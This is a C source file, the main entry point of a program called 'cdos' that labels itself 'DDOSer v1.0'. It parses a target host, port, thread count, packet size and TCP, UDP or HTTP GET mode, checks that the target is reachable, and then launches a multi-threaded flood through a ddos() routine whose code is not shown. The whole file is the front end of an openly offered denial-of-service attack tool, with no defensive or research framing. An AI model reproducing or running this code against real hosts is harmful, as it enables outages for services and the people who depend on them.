//
//  main.c
//  cdos
//
//  Created by Andre Zay on 17.12.2017.
//  Copyright © 2017 Andre Zay. All rights reserved.
//

#include <time.h>
#include <stdbool.h>

#include "ddos.h"
#include "message.h"
#include "socket.h"

bool socket_wait;

int main(int argc, const char* argv[])
{
    socket_wait=true;
    hide_warnings=false;//Ужасный код написанный ниже всего лишь навсего парсит аргументы консоли...
    srand(time(NULL));
    info("DDOSer v1.0 especially licensed for S1aVa");
#ifdef DEBUG
    info("Starting in DEBUG mode");
#endif
    if (argc < 3 || !strcmp(argv[1], "-h")) {
        info("Usage:%s -[h] <HOST> <PORT> --[r[d OR p]] -t <THREAD COUNT> -s <PACKET SIZE> [--http --no-warnings --no-check --no-wait]", argv[0]);
        return 0;
    }
    char* host = argv[1];
    
    info("Starting up");
    int port = atoi(argv[2]);
    if (port < 0) {
        error("Bad port supplied!");
        return -1;
    }
    hide_warnings=checklarg("--no-warnings", argv, argc);
    bool RANDOM_PACKET = checkarg("-r", argv, argc);
    int THREAD_COUNT = 5;
    int PACKET_SIZE = 4096;
    bool USE_HTTP = checklarg("--http", argv, argc);
    if (checkarg("-s", argv, argc)) {
        const char* raw_packetsize = getarg("-s", argv, argc);
        PACKET_SIZE = atoi(raw_packetsize);
    }
    if (checkarg("-t", argv, argc)) {
        const char* raw_threadcount = getarg("-t", argv, argc);
        THREAD_COUNT = atoi(raw_threadcount);
#ifdef DEBUG
        info("THREAD_COUNT=%d<-%s", THREAD_COUNT, raw_threadcount);
#endif
    }
    char* packet = NULL;
    if (PACKET_SIZE <= 0) {
        error("Bad packet size!");
        return -1;
    }

    if (!USE_HTTP) {
#ifdef DEBUG
        info("Using random tcp packet");
#endif
        packet = randstring(PACKET_SIZE);
    } else {
        packet = (char*)malloc(sizeof(char) * 9);
        packet = "GET /\r\n";
    }
    if (THREAD_COUNT <= 0) {
        error("Bad thread count!");
        return -1;
    }

    int PROTOCOL = MODE_TCP;
    if (checkarg("-u", argv, argc)) {
        PROTOCOL = MODE_UDP;
    }
    if (checklarg("--packetfile", argv, argc)) {
        packet = readfile(getlarg("--packetfile", argv, argc));
        if (packet == 0) {
            error("Failed to read packet file!");
            error("Exiting!");
            return -1;
        }
        PACKET_SIZE = strlen(packet);
    }
    hide_warnings=checklarg("--no-warnings", argv, argc);
    bool check=!checklarg("--no-check", argv, argc);
    socket_wait=!checklarg("--no-wait", argv, argc);
    if(check){
        info("Checking service");
        int sc=dos_tcp_sock(host, port);
        if(sc<0){
            error("Could not connect.Exiting");
            return -1;
        }
        success("Service online");
        shutdown(sc, 2);
    }
#ifdef DEBUG
    info("Launching DDOSer");
    info("HIDE_WARNINGS=%d",hide_warnings);
    warning("some warning");
    info("Config:");
    info("RANDOM_PACKET=%d", RANDOM_PACKET);
    info("THREAD_COUNT=%d", THREAD_COUNT);
    info("PACKET_SIZE=%d", PACKET_SIZE);
    info("MODE=%d", PROTOCOL);
    info("USE_HTTP=%d", USE_HTTP);
    info("PACKET=%s", packet);
#endif
    

    ddos(host, port, packet, THREAD_COUNT, PROTOCOL);

    return 0;
}
